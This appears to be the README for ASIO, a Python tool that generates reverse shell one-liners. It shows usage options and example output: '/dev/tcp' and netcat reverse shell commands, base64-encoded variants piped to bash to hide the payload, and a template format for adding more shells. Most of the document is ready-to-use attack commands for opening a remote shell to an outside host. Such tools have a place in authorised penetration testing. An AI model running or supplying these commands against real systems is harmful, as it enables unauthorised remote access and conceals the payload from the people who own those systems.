# ASIO
## Description
ASIO (All Shell In One) is a tool written in Python3 that generates reverse shells. It has the ability to **cast a one liner that uses all the available reverse shell teqniques**

## Usage
```
usage: asio.py [-h] -H HOST -P PORT [-A] [-B]

optional arguments:
  -h, --help            show this help message and exit
  -H HOST, --host HOST  Hostname or IP of the server
  -P PORT, --port PORT  Port of the server
  -A, --all             Use this argument to generate a full one liner to try all the reverse shell possible.
  -B, --base64          Encode all the reverse shells in base64 and build a one liner to execute the decoded string
```
## Examples

### Generate multiple reverse shells
Command:
```
./asio.py -H 127.0.0.1 -P 8080
```
Output:
```
 sh in dev tcp 
 sh -i >& /dev/tcp/127.0.0.1/8080 0>&1

 exec sh in dev tcp 
 0<&196;exec 196<>/dev/tcp/127.0.0.1/8080; sh <&196 >&196 2>&196
 ```

### Generate multiple reverse shells encoded in base64
Command:
```
./asio.py -H 127.0.0.1 -P 8080 -B
```
Output:
```
 sh in dev tcp 
echo "IHNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS84MDgwIDA+JjE=" | base64 -d | bash

exec sh in dev tcp 
echo "IDA8JjE5NjtleGVjIDE5Njw+L2Rldi90Y3AvMTI3LjAuMC4xLzgwODA7IHNoIDwmMTk2ID4mMTk2IDI+JjE5Ng==" | base64 -d | bash
```

### Generate one liner with all the available teqniques encoded in base64
Command:
```
./asio.py -H 127.0.0.1 -P 8080 -B -A
```
Output:
```
 All in one
echo "KCBzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjE<more base64>" | base64 -d | bash
```


## Add presonalized reverse shells
 - Edit the `personal_shells.txt` file
 - Use the following syntaxt: `Name of the Revere Shell | Reverse Shell Code`
 - Use `{HOST}` and `{PORT}` as a placeholders for address and port variables.

### Example
`sh in dev tcp | sh -i >& /dev/tcp/{HOST}/{PORT} 0>&1`

`netcat -e | nc -e /bin/sh {HOST} {PORT}`